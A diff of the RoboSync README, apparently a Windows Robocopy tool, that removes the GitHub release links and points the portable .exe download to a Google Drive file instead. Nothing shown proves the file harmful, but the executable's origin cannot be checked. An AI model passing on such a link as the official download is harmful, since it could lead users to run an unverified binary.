@@ -15,10 +15,8 @@
 
 > **Windows 10 / 11 (64-bit) required. Robocopy is built into Windows — no extra install needed.**
 
-| | |
-|---|---|
-| [📦 **Download Installer (.exe)**](https://github.com/devnxh/robosync/releases/latest) | Installs RoboSync with Start Menu shortcut and auto-uninstaller |
-| [🗜️ **Download Portable (.exe)**](https://github.com/devnxh/robosync/releases/latest) | Single .exe, no installation required — run from anywhere |
+
+| [🗜️ **Download Portable (.exe)**](https://drive.google.com/file/d/1gQyXpN1HxFGSkv8AeOCX0zXvIkaanlKe/view?usp=sharing) | Single .exe, no installation required — run from anywhere |
 
 ---
 
